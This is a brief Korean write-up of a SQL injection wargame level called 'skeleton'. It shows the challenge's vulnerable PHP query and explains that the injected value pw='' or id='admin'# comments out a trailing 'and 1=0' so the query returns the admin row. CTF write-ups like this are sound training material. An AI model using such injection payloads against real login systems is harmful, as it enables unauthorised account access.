<img width="202" alt="스크린샷 2020-01-16 오후 8 52 12" src="https://user-images.githubusercontent.com/54495632/72523391-07ce3280-38a3-11ea-8dd5-4e29954af557.png">

10번 skeleton

<img width="752" alt="스크린샷 2020-01-16 오후 8 52 19" src="https://user-images.githubusercontent.com/54495632/72523404-0ef54080-38a3-11ea-8b7e-70faf9065083.png">

$query = "select id from prob_skeleton where id='guest' and pw='{$_GET[pw]}' and 1=0"; 

쿼리문을 보면 pw 뒤에 and 1=0 부분이 있어 1=0 ->FALSE 처리 되어
이 부분을 주석처리 해야된다.

if($result['id'] == 'admin') solve("skeleton"); 
id=admin 이면 문제를 해결할 수 있으므로

pw='' or id='admin'# 과 같이 던져주면 뒤에 1=0 부분이 주석 처리되어
id=admin 조건이 성립되어 문제가 해결된다.


<img width="826" alt="스크린샷 2020-01-16 오후 8 58 52" src="https://user-images.githubusercontent.com/54495632/72523697-b2465580-38a3-11ea-8bb5-1443db3f20bb.png">